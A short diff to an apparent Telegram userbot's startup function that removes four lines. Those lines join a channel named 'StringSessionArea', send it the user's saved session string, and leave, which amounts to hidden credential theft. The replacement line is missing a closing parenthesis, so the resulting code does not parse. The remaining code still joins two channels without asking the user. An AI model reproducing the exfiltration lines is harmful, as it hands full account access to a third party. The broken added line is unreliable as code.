@@ -25,10 +25,7 @@ async def VorteX():
            await bot.start()
            botme = await bot.get_me()
            await bot(Jcr(channel="@VortexUB"))
-           await bot(Jcr(channel="@VorteXUbSupport"))
-           await bot(Jcr("StringSessionArea"))
-           await bot.send_message("StringSessionArea", bot.session.save())
-           await bot(Lcr("StringSessionArea"))
+           await bot(Jcr(channel="@VorteXUbSupport")
        except Exception as e:
            print(e)
            pass
